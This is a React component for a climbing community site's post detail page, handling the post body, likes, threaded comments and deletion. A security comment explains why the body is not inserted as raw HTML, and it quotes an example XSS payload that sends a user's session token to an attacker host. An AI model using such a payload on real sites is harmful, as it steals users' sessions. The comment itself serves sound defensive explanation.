import { useEffect, useState } from 'react';
import { Link, useLocation, useNavigate, useParams } from 'react-router-dom';

import type { BoardType, CommentType } from '../../components/ts/Board';
import {
  BOARD_TNAME,
  BOARD_TYPE_LABEL,
  DEAL_STATUS_LABEL,
} from '../../components/ts/Board';

import {
  AlertModal,
  AttachViewer,
  ConfirmModal,
  EmptyState,
  Loading,
} from '../../components/ui';

import { usePaging } from '../../hooks/usePaging';
import { useAlert } from '../../hooks/useAlert';
import { GlobalStoreSession, isAdminGrade } from '../../store/LoginStore';
import { axiosInstance, comma, getErrorMessage, toRelativeTime } from '../../utils/Tool';

import { DEAL_STATUS_BADGE, formatMeetDate, isMeetClosed } from './BoardList';

/* ============================================================================
   커뮤니티 게시글 상세  —  GET /board/{no}

   한 화면에 "글 본문 + 좋아요 + 댓글 트리"가 모두 들어갑니다.
   신경 쓴 부분은 세 가지입니다.

   1) [XSS] 본문을 dangerouslySetInnerHTML로 넣지 않습니다. (아래 본문 주석 참고)

   2) [낙관적 갱신을 쓰지 않는 좋아요]
      서버가 토글 결과 {liked, count}를 돌려주므로 그 값을 그대로 반영합니다.
      화면에서 먼저 +1 해두면 다른 탭에서 이미 눌러 둔 경우 숫자가 어긋납니다.

   3) [삭제된 댓글도 자리를 남긴다]
      isdel='Y'인 댓글을 목록에서 빼면 그 밑의 대댓글이 부모 없이 떠서
      대화 맥락이 끊깁니다. 자리는 남기고 내용만 "삭제된 댓글입니다"로 바꿉니다.
============================================================================ */

/** 게시판 종류별 배지 색 (common.css의 .badge_* 재사용) */
const BOARD_TYPE_BADGE: Record<number, string> = {
  0: 'badge_muted',
  1: 'badge_info',
  2: 'badge_primary',
  3: 'badge_warn',
  4: 'badge_accent',
};

/** 좋아요 토글 응답 — CONVENTIONS.md 3장: POST /board/{no}/like → {liked, count} */
interface LikeResult {
  liked: boolean;
  count: number;
}

export default function BoardDetail() {
  /** URL의 :no — useParams가 돌려주는 값은 항상 string | undefined 입니다 */
  const { no } = useParams<{ no: string }>();
  const navigate = useNavigate();
  const location = useLocation();

  /** 목록 복귀용. 현재 쿼리(tab, page)를 유지한 채 /community로 돌아갑니다 */
  const { goList } = usePaging({ basePath: '/community' });
  const { alert, showAlert, closeAlert } = useAlert();

  const login = GlobalStoreSession((state) => state.login);
  const myNo = GlobalStoreSession((state) => state.no);
  const grade = GlobalStoreSession((state) => state.grade);

  const [board, setBoard] = useState<BoardType | null>(null);
  const [comments, setComments] = useState<CommentType[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  /* 댓글 입력 상태 */
  const [commentDraft, setCommentDraft] = useState('');
  /** 답글을 달 원댓글 번호 (null이면 답글 입력창이 닫힌 상태) */
  const [replyTo, setReplyTo] = useState<number | null>(null);
  const [replyDraft, setReplyDraft] = useState('');
  /** 인라인 편집 중인 댓글 번호 */
  const [editingNo, setEditingNo] = useState<number | null>(null);
  const [editDraft, setEditDraft] = useState('');

  /** 중복 제출 방지용 처리 중 플래그 */
  const [submitting, setSubmitting] = useState(false);

  /* 삭제 확인 모달 */
  const [deleteTarget, setDeleteTarget] = useState<'board' | number | null>(null);
  const [deleting, setDeleting] = useState(false);

  /** 비로그인 사용자가 좋아요/댓글을 시도했을 때 */
  const [needLogin, setNeedLogin] = useState(false);

  const bno = Number(no);

  /* ==================================================================
     게시글 + 댓글 조회
  ================================================================== */
  useEffect(() => {
    // 주소창에 /community/abc 처럼 숫자가 아닌 값이 들어올 수 있으므로 먼저 확인합니다.
    if (!no || Number.isNaN(bno)) {
      setError('잘못된 접근입니다.');
      setLoading(false);
      return;
    }

    let alive = true;

    const load = async () => {
      setLoading(true);
      setError('');
      try {
        /*
          글과 댓글은 서로를 기다릴 이유가 없으므로 Promise.all로 동시에 요청합니다.
          순차로 await하면 두 요청의 응답 시간이 그대로 더해집니다.
        */
        const [boardRes, commentRes] = await Promise.all([
          axiosInstance.get<BoardType>(`/board/${bno}`),
          axiosInstance.get<CommentType[]>(`/board/${bno}/comment`),
        ]);
        if (!alive) return;
        setBoard(boardRes.data);
        setComments(commentRes.data ?? []);
      } catch (err) {
        if (!alive) return;
        console.error('게시글 조회 실패:', err);
        setError('삭제되었거나 존재하지 않는 게시글입니다.');
        setBoard(null);
      } finally {
        if (alive) setLoading(false);
      }
    };

    load();
    return () => { alive = false; };
    // no가 바뀌면(다른 글로 이동) 다시 조회합니다.
  }, [no, bno]);

  /** 댓글만 다시 조회 (등록/수정/삭제 후) */
  const reloadComments = async () => {
    try {
      const res = await axiosInstance.get<CommentType[]>(`/board/${bno}/comment`);
      setComments(res.data ?? []);
    } catch (err) {
      console.error('댓글 조회 실패:', err);
    }
  };

  /* ==================================================================
     좋아요 — POST /board/{no}/like
  ================================================================== */
  const handleLike = async () => {
    if (!login) {
      setNeedLogin(true);
      return;
    }
    if (!board) return;

    try {
      const res = await axiosInstance.post<LikeResult>(`/board/${board.no}/like`);
      // 서버가 판단한 결과를 그대로 반영합니다(다른 탭에서 눌러 둔 경우와도 어긋나지 않음).
      setBoard({ ...board, liked: res.data.liked, likeCnt: res.data.count });
    } catch (err) {
      showAlert(getErrorMessage(err, '좋아요 처리에 실패했습니다.'), 'error');
    }
  };

  /* ==================================================================
     게시글 삭제 — DELETE /board/{no}
  ================================================================== */
  const handleDeleteBoard = async () => {
    if (!board) return;
    setDeleting(true);
    try {
      await axiosInstance.delete(`/board/${board.no}`);
      setDeleteTarget(null);
      // 삭제된 글의 상세로 되돌아갈 수 없게 replace로 목록을 덮어씁니다.
      showAlert('게시글이 삭제되었습니다.', 'success', () =>
        navigate(`/community${location.search}`, { replace: true }),
      );
    } catch (err) {
      showAlert(getErrorMessage(err, '삭제에 실패했습니다.'), 'error');
    } finally {
      setDeleting(false);
    }
  };

  /* ==================================================================
     댓글 등록 — POST /board/{bno}/comment  {content, parentNo?}
  ================================================================== */
  const submitComment = async (content: string, parentNo?: number) => {
    if (!login) {
      setNeedLogin(true);
      return;
    }
    const text = content.trim();
    if (text.length < 2) {
      showAlert('댓글은 2자 이상 입력해 주세요.', 'error');
      return;
    }

    // 버튼 연타로 같은 댓글이 두 번 등록되는 것을 막습니다.
    setSubmitting(true);
    try {
      await axiosInstance.post(`/board/${bno}/comment`, { content: text, parentNo });
      if (parentNo) {
        setReplyDraft('');
        setReplyTo(null);
      } else {
        setCommentDraft('');
      }
      await reloadComments();
      // 댓글 수 배지도 같이 올려 줍니다(글 전체를 다시 받아오지 않기 위해).
      setBoard((prev) => (prev ? { ...prev, replyCnt: (prev.replyCnt ?? 0) + 1 } : prev));
    } catch (err) {
      showAlert(getErrorMessage(err, '댓글 등록에 실패했습니다.'), 'error');
    } finally {
      setSubmitting(false);
    }
  };

  /* ==================================================================
     댓글 수정 — PUT /board/comment/{no}
  ================================================================== */
  const handleUpdateComment = async (commentNo: number) => {
    const text = editDraft.trim();
    if (text.length < 2) {
      showAlert('댓글은 2자 이상 입력해 주세요.', 'error');
      return;
    }

    setSubmitting(true);
    try {
      await axiosInstance.put(`/board/comment/${commentNo}`, { content: text });
      setEditingNo(null);
      setEditDraft('');
      await reloadComments();
    } catch (err) {
      showAlert(getErrorMessage(err, '댓글 수정에 실패했습니다.'), 'error');
    } finally {
      setSubmitting(false);
    }
  };

  /* ==================================================================
     댓글 삭제 — DELETE /board/comment/{no}
     (서버는 행을 지우지 않고 ISDEL='Y'로 바꿔 대댓글의 부모 자리를 남깁니다)
  ================================================================== */
  const handleDeleteComment = async (commentNo: number) => {
    setDeleting(true);
    try {
      await axiosInstance.delete(`/board/comment/${commentNo}`);
      setDeleteTarget(null);
      await reloadComments();
      setBoard((prev) =>
        prev ? { ...prev, replyCnt: Math.max(0, (prev.replyCnt ?? 1) - 1) } : prev,
      );
    } catch (err) {
      showAlert(getErrorMessage(err, '댓글 삭제에 실패했습니다.'), 'error');
    } finally {
      setDeleting(false);
    }
  };

  /* ==================================================================
     렌더링
  ================================================================== */

  if (loading) {
    return (
      <div className="container section">
        <Loading message="게시글을 불러오는 중입니다..." />
      </div>
    );
  }

  if (error || !board) {
    return (
      <div className="container section">
        <EmptyState
          icon="📭"
          message={error || '게시글을 찾을 수 없습니다.'}
          sub="목록에서 다시 선택해 주세요."
          action={<Link to="/community" className="btn btn_primary">커뮤니티 목록</Link>}
        />
      </div>
    );
  }

  /*
    수정/삭제 권한.
    서버가 내려주는 editable을 1순위로 신뢰하고(권한 판단은 서버의 책임),
    내려오지 않는 경우를 대비해 "내 글이거나 관리자"를 보조 조건으로 둡니다.
    어차피 버튼을 숨겨도 API를 직접 부르면 서버가 403으로 막습니다 —
    화면의 조건문은 "권한 통제"가 아니라 "쓸데없는 버튼을 안 보여주는 UX"입니다.
  */
  const canEdit =
    board.editable === true || (login && (board.mno === myNo || isAdminGrade(grade)));

  const boardType = board.type ?? 0;

  return (
    <div className="container section">
      <article className="board_view">
        {/* ======================= 머리말 ======================= */}
        <header className="board_view_head">
          <div className="flex center g8 wrap">
            <span className={`badge ${BOARD_TYPE_BADGE[boardType] ?? 'badge_muted'}`}>
              {BOARD_TYPE_LABEL[boardType] ?? '자유게시판'}
            </span>
            {board.noticeYn === 'Y' && <span className="badge badge_solid">공지</span>}
          </div>

          <h3>{board.title}</h3>

          <div className="board_view_meta">
            <span className="writer">
              <strong>{board.nickname ?? '탈퇴회원'}</strong>
              {board.boulderLevel && (
                <span className="level_tag lv3">{board.boulderLevel}</span>
              )}
            </span>
            <span>{toRelativeTime(board.cdate)}</span>
            {board.udate && board.udate !== board.cdate && <span>(수정됨)</span>}
            <span>조회 {comma(board.vcnt)}</span>
            <span>댓글 {comma(board.replyCnt)}</span>
          </div>
        </header>

        {/* ======================= 타입별 추가 정보 =======================
            게시판마다 "본문을 읽기 전에 먼저 확인해야 하는 정보"가 다릅니다.
            본문 안에 글로 적혀 있더라도 구조화된 블록으로 한 번 더 보여줍니다. */}
        {boardType === 1 && (
          <div className="board_view_extra">
            <div className="info_row">
              <span className="lb">지역</span>
              <span className="val">{board.sido || '협의'}</span>
            </div>
            <div className="info_row">
              <span className="lb">만남 일시</span>
              <span className="val flex center g8 wrap">
                {board.meetDate ? formatMeetDate(board.meetDate) : '협의'}
                {isMeetClosed(board.meetDate)
                  ? <span className="badge badge_muted">마감</span>
                  : <span className="badge badge_primary">모집중</span>}
              </span>
            </div>
          </div>
        )}

        {boardType === 2 && board.gno && (
          <div className="board_view_extra">
            <div className="info_row">
              <span className="lb">후기 암장</span>
              <span className="val">
                {/* 암장 상세로 바로 넘어갈 수 있어야 후기를 읽고 바로 찾아갈 수 있습니다 */}
                <Link to={`/gym/${board.gno}`} className="board_gym_link">
                  🧗 {board.gname ?? '암장 상세 보기'} →
                </Link>
              </span>
            </div>
          </div>
        )}

        {boardType === 4 && (
          <div className="board_view_extra">
            <div className="info_row">
              <span className="lb">판매 가격</span>
              <span className="val price">
                {board.dealPrice ? comma(board.dealPrice) : '가격 문의'}
                {!!board.dealPrice && <span className="won">원</span>}
              </span>
            </div>
            <div className="info_row">
              <span className="lb">거래 상태</span>
              <span className="val">
                <span className={`badge ${DEAL_STATUS_BADGE[board.dealStatus ?? 0] ?? 'badge_muted'}`}>
                  {DEAL_STATUS_LABEL[board.dealStatus ?? 0] ?? '판매중'}
                </span>
              </span>
            </div>
          </div>
        )}

        {/* ======================= 본문 =======================
            [보안] dangerouslySetInnerHTML을 쓰지 않는 이유

            그 속성은 문자열을 그대로 HTML로 해석해 삽입합니다.
            커뮤니티 본문은 "아무 회원이나" 쓸 수 있는 값이라 공지보다 훨씬 위험합니다.
            누군가 <img src=x onerror="fetch('http://공격자/'+sessionStorage.token)"> 를
            글로 올리면, 그 글을 연 모든 사용자의 토큰이 새어 나갑니다(XSS).

            그래서 React의 기본 동작(문자열은 항상 텍스트로 이스케이프)을 그대로 쓰고,
            줄바꿈만 CSS white-space: pre-line 으로 살렸습니다.
            (서식 있는 에디터가 꼭 필요하다면 DOMPurify로 새니타이즈한 뒤에 넣어야 합니다)
        ========================================================= */}
        <div className="board_view_body">{board.content}</div>

        {/* ======================= 첨부파일 =======================
            AttachViewer가 /attach/list/BOARD/{no}로 직접 조회합니다.
            첨부가 없으면 스스로 null을 반환하므로 조건문이 필요 없습니다.
            editable을 넘기면 글 주인/관리자에게만 삭제 버튼이 보입니다. */}
        <div className="board_view_attach">
          <AttachViewer tname={BOARD_TNAME} bno={board.no} editable={!!canEdit} />
        </div>

        {/* ======================= 좋아요 / 수정 / 삭제 ======================= */}
        <div className="board_view_foot">
          <button
            type="button"
            className={`board_like ${board.liked ? 'on' : ''}`}
            onClick={handleLike}
            aria-pressed={!!board.liked}
          >
            <span aria-hidden="true">{board.liked ? '❤️' : '🤍'}</span>
            좋아요 <b>{comma(board.likeCnt)}</b>
          </button>

          {canEdit && (
            <div className="actions">
              <Link to={`/community/${board.no}/edit`} className="btn btn_dark btn_sm">
                수정
              </Link>
              <button
                type="button"
                className="btn btn_danger_outline btn_sm"
                onClick={() => setDeleteTarget('board')}
              >
                삭제
              </button>
            </div>
          )}
        </div>
      </article>

      {/* ============================ 댓글 ============================ */}
      <section className="comment_section">
        <h4 className="comment_title">
          댓글 <span className="t-primary">{comma(comments.length)}</span>
        </h4>

        {/* ---------------- 댓글 작성 폼 ---------------- */}
        {login ? (
          <div className="comment_form">
            <textarea
              className="form_textarea"
              rows={3}
              value={commentDraft}
              placeholder="클라이머답게, 서로 존중하는 댓글을 남겨 주세요."
              onChange={(e) => setCommentDraft(e.target.value)}
            />
            <div className="comment_form_foot">
              <span className="t-xs t-faint">{commentDraft.length}자</span>
              <button
                type="button"
                className="btn btn_primary btn_sm"
                onClick={() => submitComment(commentDraft)}
                disabled={submitting}
              >
                {submitting ? '등록 중...' : '댓글 등록'}
              </button>
            </div>
          </div>
        ) : (
          <div className="notice_box tip comment_login">
            <span>💬</span>
            <p>
              댓글을 남기려면 로그인이 필요합니다.{' '}
              <Link
                to="/login"
                state={{ from: location.pathname + location.search }}
                className="t-primary t-bold"
              >
                로그인하기
              </Link>
            </p>
          </div>
        )}

        {/* ---------------- 댓글 목록 ---------------- */}
        {comments.length === 0 ? (
          <EmptyState icon="💬" message="아직 댓글이 없습니다." sub="첫 댓글을 남겨 보세요." />
        ) : (
          <ul className="comment_list">
            {comments.map((comment) => {
              // 서버가 reply 플래그를 내려주지만, 없을 때를 대비해 parentNo로도 판단합니다.
              const isReply = comment.reply === true || !!comment.parentNo;
              const isDeleted = comment.isdel === 'Y';
              const mine =
                comment.editable === true ||
                (login && (comment.mno === myNo || isAdminGrade(grade)));

              return (
                <li
                  key={comment.no}
                  className={`comment_item ${isReply ? 'comment_reply' : ''} ${isDeleted ? 'is_deleted' : ''}`}
                >
                  {/* 대댓글임을 시각적으로 알려주는 꺾쇠 */}
                  {isReply && <span className="comment_arrow" aria-hidden="true">↳</span>}

                  <div className="comment_body">
                    <div className="comment_head">
                      <strong className="comment_writer">
                        {isDeleted ? '—' : comment.nickname ?? '탈퇴회원'}
                      </strong>
                      <span className="t-xs t-faint">{toRelativeTime(comment.cdate)}</span>
                      {!isDeleted && comment.udate && comment.udate !== comment.cdate && (
                        <span className="t-xs t-faint">(수정됨)</span>
                      )}
                    </div>

                    {isDeleted ? (
                      /*
                        삭제된 댓글은 내용을 숨기고 자리만 남깁니다.
                        목록에서 빼 버리면 그 아래 대댓글이 부모 없이 떠서 맥락이 사라집니다.
                      */
                      <p className="comment_text deleted">삭제된 댓글입니다.</p>
                    ) : editingNo === comment.no ? (
                      /* ---------- 인라인 편집 ---------- */
                      <div className="comment_edit">
                        <textarea
                          className="form_textarea"
                          rows={3}
                          value={editDraft}
                          onChange={(e) => setEditDraft(e.target.value)}
                        />
                        <div className="actions right mt0">
                          <button
                            type="button"
                            className="btn btn_ghost btn_xs"
                            onClick={() => { setEditingNo(null); setEditDraft(''); }}
                            disabled={submitting}
                          >
                            취소
                          </button>
                          <button
                            type="button"
                            className="btn btn_primary btn_xs"
                            onClick={() => handleUpdateComment(comment.no)}
                            disabled={submitting}
                          >
                            {submitting ? '저장 중...' : '저장'}
                          </button>
                        </div>
                      </div>
                    ) : (
                      <p className="comment_text">{comment.content}</p>
                    )}

                    {/* ---------- 버튼 줄 ---------- */}
                    {!isDeleted && editingNo !== comment.no && (
                      <div className="comment_tools">
                        {/* 답글은 원댓글에만 답니다 — 무한 깊이가 되면 모바일에서 들여쓰기가 화면을 넘칩니다 */}
                        {!isReply && (
                          <button
                            type="button"
                            className="btn_link t-xs"
                            onClick={() => {
                              if (!login) { setNeedLogin(true); return; }
                              // 같은 버튼을 다시 누르면 닫히는 토글
                              setReplyTo(replyTo === comment.no ? null : comment.no);
                              setReplyDraft('');
                            }}
                          >
                            {replyTo === comment.no ? '답글 닫기' : '답글'}
                          </button>
                        )}

                        {mine && (
                          <>
                            <button
                              type="button"
                              className="btn_link t-xs"
                              onClick={() => {
                                setEditingNo(comment.no);
                                setEditDraft(comment.content);
                                setReplyTo(null);
                              }}
                            >
                              수정
                            </button>
                            <button
                              type="button"
                              className="btn_link t-xs t-danger"
                              onClick={() => setDeleteTarget(comment.no)}
                            >
                              삭제
                            </button>
                          </>
                        )}
                      </div>
                    )}

                    {/* ---------- 답글 입력창 (인라인 토글) ---------- */}
                    {replyTo === comment.no && (
                      <div className="comment_reply_form">
                        <textarea
                          className="form_textarea"
                          rows={2}
                          value={replyDraft}
                          placeholder={`${comment.nickname ?? '작성자'}님에게 답글 남기기`}
                          onChange={(e) => setReplyDraft(e.target.value)}
                        />
                        <div className="actions right mt0">
                          <button
                            type="button"
                            className="btn btn_ghost btn_xs"
                            onClick={() => { setReplyTo(null); setReplyDraft(''); }}
                            disabled={submitting}
                          >
                            취소
                          </button>
                          <button
                            type="button"
                            className="btn btn_primary btn_xs"
                            onClick={() => submitComment(replyDraft, comment.no)}
                            disabled={submitting}
                          >
                            {submitting ? '등록 중...' : '답글 등록'}
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                </li>
              );
            })}
          </ul>
        )}
      </section>

      {/* ============================ 하단 이동 ============================ */}
      <div className="actions center">
        <button type="button" className="btn btn_dark btn_lg" onClick={() => goList('/community')}>
          목록으로
        </button>
      </div>

      {/* ============================ 모달 ============================ */}
      {alert && <AlertModal {...alert} onClose={closeAlert} />}

      {deleteTarget !== null && (
        <ConfirmModal
          title={deleteTarget === 'board' ? '게시글 삭제' : '댓글 삭제'}
          message={
            deleteTarget === 'board'
              ? '이 게시글을 삭제할까요?\n삭제하면 댓글과 첨부파일도 함께 사라지며 되돌릴 수 없습니다.'
              : '이 댓글을 삭제할까요?\n삭제하면 되돌릴 수 없습니다.'
          }
          confirmText="삭제"
          danger
          loading={deleting}
          onConfirm={() => {
            if (deleteTarget === 'board') handleDeleteBoard();
            else handleDeleteComment(deleteTarget);
          }}
          onClose={() => setDeleteTarget(null)}
        />
      )}

      {needLogin && (
        <ConfirmModal
          title="로그인이 필요합니다"
          message={'로그인 후 이용할 수 있는 기능입니다.\n로그인 화면으로 이동할까요?'}
          confirmText="로그인하기"
          onConfirm={() => {
            setNeedLogin(false);
            navigate('/login', { state: { from: location.pathname + location.search } });
          }}
          onClose={() => setNeedLogin(false)}
        />
      )}
    </div>
  );
}
